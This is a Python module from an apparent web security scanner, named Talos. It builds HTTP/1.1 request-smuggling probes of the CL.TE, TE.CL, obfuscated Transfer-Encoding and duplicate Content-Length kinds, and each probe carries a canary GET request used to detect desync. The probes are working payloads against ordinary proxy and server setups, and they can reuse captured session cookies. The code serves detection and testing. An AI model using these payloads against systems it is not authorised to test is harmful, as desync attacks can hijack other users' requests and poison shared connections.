"""
Module: talos.smuggle.payloads

Purpose:
    Build raw HTTP/1.1 smuggling probes (CL.TE, TE.CL, obfuscated TE, CL.CL).

    Each payload plants a unique canary GET after the prefix the "wrong"
    parser would treat as the end of the body. A follow-up request on the
    same connection is then either clean or prefixed by that leftover.

Dependencies: talos.smuggle.models
Data flow: CLI / engine → generate_smuggle_payloads → SmugglePayload
Side effects: None.
"""

from __future__ import annotations

from typing import Optional

from talos.smuggle.models import (
    FAMILY_CLCL,
    FAMILY_CLTE,
    FAMILY_TE_OBFUSCATE,
    FAMILY_TECL,
    TECHNIQUE_NAMES,
    SmugglePayload,
)


def canary_path_for(nonce: str) -> str:
    """
    Purpose:
        Stable unique path that should 404 on a healthy origin.
    Input:
        nonce — hex token from the run (job meta).
    Output:
        Path beginning with /talos-hrs-.
    """
    token = (nonce or "x").strip() or "x"
    return f"/talos-hrs-{token}"


def canary_request(canary_path: str, host: str) -> bytes:
    """
    Purpose:
        Leftover request bytes the desync should prefix onto the follow-up.
    Output:
        Complete GET request (CRLF).
    """
    path = canary_path if canary_path.startswith("/") else f"/{canary_path}"
    host_hdr = (host or "localhost").split("/")[0]
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_hdr}\r\n"
        f"X-Talos-Desync: 1\r\n"
        f"\r\n"
    ).encode("ascii")


def render_http_request(
    method: str,
    target: str,
    headers: list[tuple[str, str]] | tuple[tuple[str, str], ...],
    body: bytes = b"",
) -> bytes:
    """
    Purpose:
        Serialize an HTTP/1.1 request without normalizing duplicate headers.
    Output:
        Wire bytes (CRLF).
    """
    verb = (method or "POST").strip().upper() or "POST"
    path = target if (target or "").startswith("/") else f"/{target or ''}"
    lines = [f"{verb} {path} HTTP/1.1".encode("ascii", errors="replace")]
    for name, value in headers:
        lines.append(
            f"{name}: {value}".encode("latin-1", errors="replace")
        )
    return b"\r\n".join(lines) + b"\r\n\r\n" + (body or b"")


def _cl_te_body(canary: bytes) -> bytes:
    """0-chunk then leftover canary. Front CL forwards all; back TE stops at 0."""
    return b"0\r\n\r\n" + canary


def _te_cl_parts(canary: bytes) -> tuple[bytes, str]:
    """
    Purpose:
        Chunked body whose Content-Length covers only the size line.
    Output:
        (body, content_length_value).
    """
    size_line = f"{len(canary):x}\r\n".encode("ascii")
    body = size_line + canary + b"\r\n0\r\n\r\n"
    return body, str(len(size_line))


def generate_smuggle_payloads(
    *,
    host: str,
    nonce: str,
    extra_headers: Optional[list[tuple[str, str]]] = None,
    techniques: Optional[list[str]] = None,
) -> list[SmugglePayload]:
    """
    Purpose:
        Build the catalogue (or a subset) for one origin / nonce.
    Input:
        host          — Host header value (netloc).
        nonce         — unique run token (canary path).
        extra_headers — session cookies / bearer copied from the capture.
        techniques    — optional name filter (unknown names raise ValueError).
    Output:
        Ordered SmugglePayload list.
    """
    wanted: Optional[set[str]] = None
    if techniques:
        unknown = [name for name in techniques if name not in TECHNIQUE_NAMES]
        if unknown:
            raise ValueError(
                "unknown smuggle technique(s): " + ", ".join(unknown)
            )
        wanted = set(techniques)

    canary = canary_path_for(nonce)
    leftover = canary_request(canary, host)
    extras = tuple(extra_headers or ())
    host_hdr = (host or "localhost").split("/")[0]

    cl_te_body = _cl_te_body(leftover)
    te_cl_body, te_cl_len = _te_cl_parts(leftover)

    built: list[SmugglePayload] = []

    def _add(
        name: str,
        family: str,
        description: str,
        headers: list[tuple[str, str]],
        body: bytes,
    ) -> None:
        if wanted is not None and name not in wanted:
            return
        merged = (
            ("Host", host_hdr),
            ("Connection", "keep-alive"),
            ("User-Agent", "Talos-smuggle"),
            *extras,
            *headers,
        )
        built.append(
            SmugglePayload(
                technique=name,
                family=family,
                description=description,
                method="POST",
                headers=merged,
                body=body,
                canary_path=canary,
            )
        )

    _add(
        "cl_te",
        FAMILY_CLTE,
        "Content-Length + Transfer-Encoding: chunked (front CL, back TE).",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(cl_te_body))),
            ("Transfer-Encoding", "chunked"),
        ],
        cl_te_body,
    )
    _add(
        "te_cl",
        FAMILY_TECL,
        "Chunked body with a short Content-Length (front TE, back CL).",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", te_cl_len),
            ("Transfer-Encoding", "chunked"),
        ],
        te_cl_body,
    )
    _add(
        "te_space",
        FAMILY_TE_OBFUSCATE,
        "Obfuscated TE: 'chunked' with a trailing space.",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(cl_te_body))),
            ("Transfer-Encoding", "chunked "),
        ],
        cl_te_body,
    )
    _add(
        "te_tab",
        FAMILY_TE_OBFUSCATE,
        "Obfuscated TE: tab before 'chunked'.",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(cl_te_body))),
            ("Transfer-Encoding", "\tchunked"),
        ],
        cl_te_body,
    )
    _add(
        "te_xchunked",
        FAMILY_TE_OBFUSCATE,
        "Obfuscated TE: xchunked (one parser ignores TE).",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(cl_te_body))),
            ("Transfer-Encoding", "xchunked"),
        ],
        cl_te_body,
    )
    _add(
        "te_dual",
        FAMILY_TE_OBFUSCATE,
        "Two Transfer-Encoding headers (chunked + identity).",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(cl_te_body))),
            ("Transfer-Encoding", "chunked"),
            ("Transfer-Encoding", "identity"),
        ],
        cl_te_body,
    )
    _add(
        "cl_cl",
        FAMILY_CLCL,
        "Two Content-Length headers with conflicting values.",
        [
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Content-Length", str(len(leftover))),
            ("Content-Length", "0"),
        ],
        leftover,
    )
    return built
